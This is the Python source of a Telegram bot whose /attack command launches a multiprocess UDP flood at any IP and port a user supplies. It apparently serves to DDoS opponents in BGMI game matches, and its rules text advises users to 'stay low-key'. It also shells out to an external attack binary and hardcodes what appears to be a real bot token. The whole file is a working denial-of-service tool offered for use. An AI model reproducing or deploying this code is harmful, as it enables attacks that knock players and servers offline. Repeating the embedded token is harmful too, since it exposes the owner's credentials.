import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import asyncio
import requests  # Added for get_user_ip

# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '6875476991:AAGI0pdjUFcic6kkNoJmu44jGKmgOx0tmtk'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ Owner Telegram ID and lists for authorized users and admin users.
OWNER_ID = 6667276878  # Replace with your owner Telegram ID
AUTHORIZED_USERS = [OWNER_ID]  # Initially, only the owner is authorized.
ADMIN_USERS = [OWNER_ID]       # Initially, owner is also an admin.

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variable to track attack state
attack_in_progress = False

async def run_attack_command_async(target_ip, target_port, duration):
    """Run a BGMI attack command asynchronously."""
    global attack_in_progress
    attack_in_progress = True

    try:
        # Execute the external BGMI tool
        process = await asyncio.create_subprocess_shell(f"./iiiipx {target_ip} {target_port} {duration}")
        await process.communicate()
    except Exception as e:
        logging.error(f"Error running attack command: {e}")
    finally:
        attack_in_progress = False
        notify_attack_finished(target_ip, target_port, duration)

def notify_attack_finished(target_ip, target_port, duration):
    """Notify when an attack has finished."""
    logging.info(f"Attack on {target_ip}:{target_port} for {duration}s is complete.")

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port):
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 500 CPU threads for maximum performance
    for _ in range(min(500, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    bot.send_message(user_id, f"☢️Launching an attack on {target_ip}:{target_port} 💀")

# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()  # 🛑 Stop the attack

        # 🕒 Wait for all processes to finish
        for process in processes:
            process.join()

        del user_attacks[user_id]
        bot.send_message(user_id, "🔴 All Attack stopped.")
    else:
        bot.send_message(user_id, "❌ No active attack found >ᴗ<")

# 🕰️ Function to calculate bot uptime
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @PYSCHOxKINGYT")
    else:
        welcome_message = (
            "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
            "Use /attack `<IP>:<port>` to start an attack, or /stop to halt your attack.\n\n"
            "📜 **Bot Rules - Keep It Cool!** 🌟\n"
            "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
            "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
            "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
            "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
            "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
            "6. Report issues! 🛡️ Message the owner for any problems.\n"
            "7. Always check your command before executing! ✅\n"
            "8. Do not attack without permission! ❌⚠️\n"
            "9. Be aware of the consequences of your actions! ⚖️\n"
            "10. Stay within the limits and play fair! 🤗\n"
            "💡 Follow the rules and let's enjoy gaming together! 🎉\n"
            "📞 Contact the owner on Instagram and Telegram: @PYSCHOxKINGYT\n"
            "☠️ To see the Telegram Bot Command type: /help\n"
            "👤 To find your user ID type: /id"
        )
        bot.send_message(message.chat.id, welcome_message)

# 💬 Command handler for /attack
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @PYSCHOxKINGYT")
        return

    # Parse target IP and port from the command
    try:
        command = message.text.split()
        target = command[1].split(':')
        target_ip = target[0]
        target_port = int(target[1])
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")

# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @PYSCHOxKINGYT")
        return

    stop_attack(user_id)

# 💬 Command handler for /id  
@bot.message_handler(commands=['id'])
def show_id(message):
    user_id = message.from_user.id
    username = message.from_user.username
    log_command(user_id, '/id')
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
                                      f"👥 Your Username is: @{username}")
    bot_owner = "@PYSCHOxKINGYTr"
    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")

# 💬 Command handler for /rules
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @PYSCHOxKINGYT")

# 💬 Command handler for /uptime
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')
    bot.send_message(message.chat.id, "Checking your connection speed...")
    start_time = time.time()
    try:
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.send_message(message.chat.id, ping_response)
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🤔 **Need Help?** 🤔\n"
        "Here are the available commands:\n"
        "🔹 **/start** - Start the bot 🔋\n"
        "💣 **/attack `<IP>:<port>`** - Launch a powerful attack 💥\n"
        "🛑 **/stop** - Stop the attack 🛑️\n"
        "👀 **/id** - Show your user ID 👤\n"
        "📚 **/rules** - View the bot rules 📖\n"
        "👑 **/owner** - Contact the owner 👑\n"
        "⏰ **/uptime** - Get bot uptime ⏱️\n"
        "📊 **/ping** - Check your connection ping 📈\n"
        "🤝 **/help** - Show this help message 🤝\n\n"
        "⚙️ **Owner Commands:**\n"
        "   /add `<userid>` - Approve a new user\n"
        "   /remove `<userid>` - Remove an approved user\n"
        "   /addadmin `<userid>` - Approve a user as admin\n"
        "   /deladmin `<userid>` - Remove admin privileges\n"
    )
    bot.send_message(message.chat.id, help_message)

##############################################
#              OWNER-ONLY COMMANDS         #
##############################################

def is_owner(user_id):
    return user_id == OWNER_ID

# /add command to approve users
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = message.from_user.id
    log_command(user_id, '/add')
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "🚫 Access Denied! Only the owner can execute this command.")
        return
    try:
        parts = message.text.split()
        new_user_id = int(parts[1])
        if new_user_id in AUTHORIZED_USERS:
            bot.send_message(message.chat.id, f"User {new_user_id} is already approved.")
        else:
            AUTHORIZED_USERS.append(new_user_id)
            bot.send_message(message.chat.id, f"✅ User {new_user_id} approved successfully.")
            logging.info(f"Owner added user {new_user_id} to AUTHORIZED_USERS")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /add `<userid>`.")

# /remove command to remove approved users
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id
    log_command(user_id, '/remove')
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "🚫 Access Denied! Only the owner can execute this command.")
        return
    try:
        parts = message.text.split()
        rem_user_id = int(parts[1])
        if rem_user_id in AUTHORIZED_USERS:
            AUTHORIZED_USERS.remove(rem_user_id)
            bot.send_message(message.chat.id, f"✅ User {rem_user_id} removed successfully.")
            logging.info(f"Owner removed user {rem_user_id} from AUTHORIZED_USERS")
        else:
            bot.send_message(message.chat.id, f"User {rem_user_id} is not in the approved list.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /remove `<userid>`.")

# /addadmin command to add an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = message.from_user.id
    log_command(user_id, '/addadmin')
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "🚫 Access Denied! Only the owner can execute this command.")
        return
    try:
        parts = message.text.split()
        new_admin_id = int(parts[1])
        if new_admin_id in ADMIN_USERS:
            bot.send_message(message.chat.id, f"User {new_admin_id} is already an admin.")
        else:
            ADMIN_USERS.append(new_admin_id)
            bot.send_message(message.chat.id, f"✅ User {new_admin_id} granted admin privileges successfully.")
            logging.info(f"Owner added user {new_admin_id} to ADMIN_USERS")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /addadmin `<userid>`.")

# /deladmin command to remove an admin
@bot.message_handler(commands=['deladmin'])
def del_admin(message):
    user_id = message.from_user.id
    log_command(user_id, '/deladmin')
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "🚫 Access Denied! Only the owner can execute this command.")
        return
    try:
        parts = message.text.split()
        rem_admin_id = int(parts[1])
        if rem_admin_id in ADMIN_USERS:
            ADMIN_USERS.remove(rem_admin_id)
            bot.send_message(message.chat.id, f"✅ User {rem_admin_id} admin privileges removed successfully.")
            logging.info(f"Owner removed user {rem_admin_id} from ADMIN_USERS")
        else:
            bot.send_message(message.chat.id, f"User {rem_admin_id} is not in the admin list.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Invalid format! Use /deladmin `<userid>`.")

#### DISCLAIMER ####
"""
**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**

This bot is owned and operated by @PYSCHOxKINGYT on Telegram and KaliaYtOwner on Instagram. By using this bot, you acknowledge that you understand and agree to the following terms:

* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind.
* **🚫 LIMITATION OF LIABILITY**: The owner and operator shall not be liable for any damages or losses arising from the use of this bot.
* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws.
* **📊 DATA COLLECTION**: This bot may collect and use data about your usage.
* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless the owner from any claims arising from your use of this bot.
* **🌐 THIRD-PARTY LINKS**: The owner is not responsible for third-party content.
* **🔄 MODIFICATION AND DISCONTINUATION**: The owner may modify or discontinue this bot at any time.
* **👧 AGE RESTRICTION**: This bot is not intended for use by minors.
* **🇮🇳 GOVERNING LAW**: This disclaimer will be governed by the laws of India.
* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement regarding your use of this bot.
* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read and agree to these terms.

**👋 THANK YOU FOR READING! 👋**
"""

# 🎮 Run the bot
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")
    print(" ⏱️ Initializing bot components...")
    time.sleep(5)
    print(" 🚀 Telegram bot started successfully!")
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)
        print(" 🔁 Restarting the Telegram bot...")
        print(" 💻 Bot is now restarting. Please wait... ⏳")
